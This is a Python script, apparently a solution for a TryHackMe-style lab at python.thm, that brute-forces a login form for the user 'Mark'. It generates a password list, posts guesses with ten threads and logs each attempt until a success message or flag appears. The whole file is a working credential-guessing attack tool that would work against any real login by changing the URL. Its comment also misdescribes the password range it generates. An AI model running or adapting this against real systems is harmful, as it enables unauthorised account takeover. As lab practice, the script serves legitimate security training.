import requests
from concurrent.futures import ThreadPoolExecutor
import random
import logging
import threading

url = "http://python.thm/labs/lab1/index.php"

username = "Mark"

# Generating 3-digit numeric and one uppercase Alphabet passwords (0000-9999)

password_list = [f"{str(i)*3}{chr(j)}" for i in range(10) for j in range(65, 91)]

logging.basicConfig(filename='brute_force_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

def brute_force():
    def try_password(password):
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
    
        if "Congratulation!" in response.text or "THM{" in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            logging.info(f"[+] Found valid credentials: {username}: {password}")
            return password
        else:
            print(f"[-] Attempted: {password}")
            logging.info(f"[-] Attempted: {password}")
            return None

    random.shuffle(password_list)
    with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(try_password, pwd) for pwd in password_list]
            for future in futures:
                result = future.result()
                if result:
                    break
brute_force()
